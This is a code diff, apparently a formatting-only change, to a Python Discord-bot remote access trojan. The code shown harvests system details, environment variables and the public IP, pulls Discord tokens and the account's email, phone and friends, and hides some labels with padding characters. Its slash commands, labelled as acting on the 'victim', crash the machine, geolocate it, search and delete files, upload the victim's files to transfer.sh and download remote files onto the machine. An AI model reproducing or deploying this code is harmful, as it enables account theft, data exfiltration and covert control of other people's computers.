@@ -142,13 +142,13 @@ def systemInfo():
 	output = ""
 	ip = get('https://api.ipify.org')
 	envsToGet = ["LANG", "COMPUTERNAME", "COMMONPROGRAMFILES", "LOCALAPPDATA", "OS", "PROCESSOR_ARCHITECTURE",
-	             "SYSTEMROOT", "TEMP", "USERDOMAIN", "USERNAME", "USERPROFILE"]
+				 "SYSTEMROOT", "TEMP", "USERDOMAIN", "USERNAME", "USERPROFILE"]
 	for i in envsToGet:
 		output += f"{i} = {os.getenv(i)}\n"
 	import platform
 	info = platform.uname()
 	info_total = f"""
-        System: {info.system}
+	System: {info.system}
 	Release: {info.release}
 	Machine: {info.machine}
 	Processor: {info.processor}
@@ -255,7 +255,7 @@ def getDiscordData():
 	def getFriends(token):
 		try:
 			return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships",
-			                             headers=getHeader(token))).read().decode())
+										 headers=getHeader(token))).read().decode())
 		except:
 			pass
 
@@ -282,12 +282,12 @@ def getDiscordData():
 						uid = b64decode(T0K3N.split(".")[0].encode()).decode()
 					except:
 						pass
-					# if not uid or uid in working_ids:
-					# 	continue
+				# if not uid or uid in working_ids:
+				# 	continue
 				user_data = getUserData(T0K3N)
 				if not user_data:
 					with open(f"{temp}\\discordinfo.txt", "a") as f:
-						f.write(T0K3N+"\n")
+						f.write(T0K3N + "\n")
 					continue
 				working_ids.append(uid)
 				working.append(T0K3N)
@@ -299,7 +299,7 @@ def getDiscordData():
 				info = f"####Ma#i##l#: {email}\n#P#h##o##ne: ##{phone}\n#N#i#t#r3###o##: {nitro}\n#U#s#e#r#n#a#m#e: {pc_username}\n#P#C# #N#a#m####e: {pc_name}\nT##0##k##e##n Location: {platform}\nT##3#o##k##e##n #: {T0K3N}\nUsername: {username} ({user_id})\n\nUser Data: {user_data}\n\nFriends: {getFriends(T0K3N)}"
 				info = info.replace("#", "")
 				with open(f"{temp}\\discordinfo.txt", "a") as f:
-					f.write(info+"\n")
+					f.write(info + "\n")
 				f.close()
 
 	main()
@@ -307,7 +307,7 @@ def getDiscordData():
 
 
 @bot.tree.command(name="discordinfo",
-                  description="get victim's discord info")
+				  description="get victim's discord info")
 async def discordinfo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting discordInfo...")
 	getDiscordData()
@@ -316,7 +316,7 @@ async def discordinfo(interaction: discord.Interaction):
 
 
 @bot.tree.command(name="crash",
-                  description="crash your victim's computer")
+				  description="crash your victim's computer")
 async def geo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"crashing machine...")
 	await interaction.channel.send(crash())
@@ -351,7 +351,7 @@ async def typing(interaction: discord.Interaction, message: str):
 
 
 @bot.tree.command(name="tasklist",
-                  description="list all running processes")
+				  description="list all running processes")
 async def tasklist(interaction: discord.Interaction):
 	await interaction.response.send_message(f"listing all tasks...")
 	await interaction.channel.send(file=discord.File(getTasklist()))
@@ -359,14 +359,14 @@ async def tasklist(interaction: discord.Interaction):
 
 
 @bot.tree.command(name="geolocate",
-                  description="get the geolocation of the of the machine with google maps (not very precise)")
+				  description="get the geolocation of the of the machine with google maps (not very precise)")
 async def geo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting geolocation by ip...")
 	await interaction.channel.send(geolocate())
 
 
 @bot.tree.command(name="systeminfo",
-                  description="attempt to get system info")
+				  description="attempt to get system info")
 async def sysinfo(interaction: discord.Interaction):
 	await interaction.response.send_message(f"getting system info...")
 	systempath, envpath = systemInfo()
@@ -385,14 +385,14 @@ async def scr(interaction: discord.Interaction):
 
 
 @bot.tree.command(name="upload",
-                  description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
+				  description="upwnload a file of the victim to transfer.sh (use %user% instead of username)")
 async def upload(interaction: discord.Interaction, location: str):
 	await interaction.response.send_message(f"searching for `{location}`...")
 	await interaction.channel.send(transfer(location))
 
 
 @bot.tree.command(name="search",
-                  description="search for a file on the victim's pc pc (use %user% instead of username)")
+				  description="search for a file on the victim's pc pc (use %user% instead of username)")
 async def search(interaction: discord.Interaction, location: str, keyword: str):
 	await interaction.response.send_message(f"searching for keyword `{keyword}` in `{location}`...")
 	await interaction.channel.send(searchFile(location, keyword))
@@ -405,7 +405,7 @@ async def deleteFile(interaction: discord.Interaction, locinput: str):
 
 
 @bot.tree.command(name="download",
-                  description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
+				  description="download a file on the machine of the victim (needs to be raw [eg. github raw))")
 async def downloadFile(interaction: discord.Interaction, targeturl: str, directory: str, filename: str):
 	await interaction.response.send_message(f"searching for `{targeturl}`...")
 	await interaction.channel.send(filedownload(targeturl, directory, filename))
